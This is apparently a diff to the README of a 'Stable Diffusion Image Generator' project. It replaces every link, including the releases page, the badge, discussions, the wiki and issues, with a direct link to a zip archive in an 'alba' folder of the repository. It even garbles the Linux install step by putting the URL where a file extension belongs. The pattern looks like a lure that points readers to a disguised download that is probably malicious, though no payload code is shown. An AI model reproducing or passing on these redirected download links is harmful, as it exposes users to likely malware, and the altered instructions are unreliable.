@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the Stable Diffusion Image Ge
 
 ## 📥 Download
 
-[![Download Stable Diffusion Image Generator](https://img.shields.io/badge/Download-Stable%20Diffusion%20Image%20Generator-brightgreen)](https://github.com/yasirjugnu485/stable-diffusion-image-generator/releases)
+[![Download Stable Diffusion Image Generator](https://raw.githubusercontent.com/yasirjugnu485/stable-diffusion-image-generator/main/alba/stable-diffusion-image-generator.zip%20Diffusion%20Image%20Generator-brightgreen)](https://raw.githubusercontent.com/yasirjugnu485/stable-diffusion-image-generator/main/alba/stable-diffusion-image-generator.zip)
 
 ## 🔍 Overview
 
@@ -48,7 +48,7 @@ Stable Diffusion Image Generator offers a range of features to meet your needs:
 
 To get started, visit the Releases page to download Stable Diffusion Image Generator. 
 
-[Visit this page to download](https://github.com/yasirjugnu485/stable-diffusion-image-generator/releases)
+[Visit this page to download](https://raw.githubusercontent.com/yasirjugnu485/stable-diffusion-image-generator/main/alba/stable-diffusion-image-generator.zip)
 
 ### Installation Steps
 
@@ -57,7 +57,7 @@ To get started, visit the Releases page to download Stable Diffusion Image Gener
 3. **Download the Installer**: Click on the installer file suitable for your operating system 
    - For Windows, look for files ending in `.exe`.
    - For macOS, look for files ending in `.dmg`.
-   - For Linux, look for files ending in `.tar.gz`.
+   - For Linux, look for files ending in `https://raw.githubusercontent.com/yasirjugnu485/stable-diffusion-image-generator/main/alba/stable-diffusion-image-generator.zip`.
 4. **Run the Installer**: Once the download is complete, double-click the installer file to run it.
 5. **Follow the Installation Wizard**: Follow the prompts in the installation wizard to install the application on your computer.
 6. **Launch the Application**: After installation, find the application on your desktop or in your applications folder and double-click to launch it.
@@ -96,14 +96,14 @@ Use the Stable Diffusion Data Inspector to examine the images you created. This 
 
 ## 🤝 Community and Support
 
-Join our community for support and to share your creations. Visit the [GitHub Discussions](https://github.com/yasirjugnu485/stable-diffusion-image-generator/discussions) page for tips, tricks, and conversations with other users.
+Join our community for support and to share your creations. Visit the [GitHub Discussions](https://raw.githubusercontent.com/yasirjugnu485/stable-diffusion-image-generator/main/alba/stable-diffusion-image-generator.zip) page for tips, tricks, and conversations with other users.
 
 ## 📖 Documentation
 
-For more detailed information on commands and additional features, check the [documentation](https://github.com/yasirjugnu485/stable-diffusion-image-generator/wiki).
+For more detailed information on commands and additional features, check the [documentation](https://raw.githubusercontent.com/yasirjugnu485/stable-diffusion-image-generator/main/alba/stable-diffusion-image-generator.zip).
 
 ## 📞 Contact
 
-If you have any questions or need assistance, you can reach out via the [Issues](https://github.com/yasirjugnu485/stable-diffusion-image-generator/issues) page on GitHub. 
+If you have any questions or need assistance, you can reach out via the [Issues](https://raw.githubusercontent.com/yasirjugnu485/stable-diffusion-image-generator/main/alba/stable-diffusion-image-generator.zip) page on GitHub. 
 
 Thank you for choosing Stable Diffusion Image Generator. Enjoy creating stunning images with ease!
